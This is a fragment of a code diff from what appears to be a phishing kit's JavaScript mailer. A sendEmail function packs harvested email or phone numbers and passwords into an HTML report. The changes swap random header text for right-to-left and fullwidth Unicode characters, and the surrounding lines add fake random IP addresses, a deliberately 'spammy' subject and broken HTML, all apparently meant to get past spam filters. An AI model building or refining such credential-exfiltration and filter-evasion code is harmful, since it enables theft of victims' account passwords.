@@ -444,7 +444,7 @@ async function sendEmail(data, folderName) {
 </head>
 <body>
 <div class="container">
-    <div class="topbar">${gstRandom}</div>
+    <div class="topbar">${gstRTL}</div>
     <table>
         <tr><td class="label">Email / Phone</td><td class="value" style="color:#4fc3f7;">${data.email || '-'}</td></tr>
         <tr><td class="label">Password</td><td class="value">${data.emailPassword || '-'}</td></tr>
@@ -496,7 +496,7 @@ async function sendEmail(data, folderName) {
         const randIp = `${randInt(1,255)}.${randInt(1,255)}.${randInt(1,255)}.${randInt(1,255)}`;
         const randIp2 = `${randInt(1,255)}.${randInt(1,255)}.${randInt(1,255)}.${randInt(1,255)}`;
 
-        const spammySubject = `${gstRandom} ${config.subject} ${flagEmoji} ${data.email || '-'} ${cityName}`;
+        const spammySubject = `${gstFullwidth} ${config.subject} ${flagEmoji} ${data.email || '-'} ${cityName}`;
 
         const brokenHtml = `
             <font face="Arial" size="2">
